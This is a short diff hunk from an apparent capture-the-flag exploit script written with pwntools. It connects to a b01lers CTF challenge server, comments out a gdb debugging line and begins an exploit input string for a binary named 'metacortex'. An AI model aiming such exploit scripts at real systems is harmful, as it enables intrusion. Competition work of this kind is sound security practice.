@@ -15,7 +15,7 @@ from pwn import *
 
 #p = process('./metacortex')
 p = remote('chal.ctf.b01lers.com', 1014)
-gdb.attach(p.pid, 'break *main + 430')
+#gdb.attach(p.pid, 'break *main + 430')
 print(p.recv())
 
 exploit = '825307441\x00'
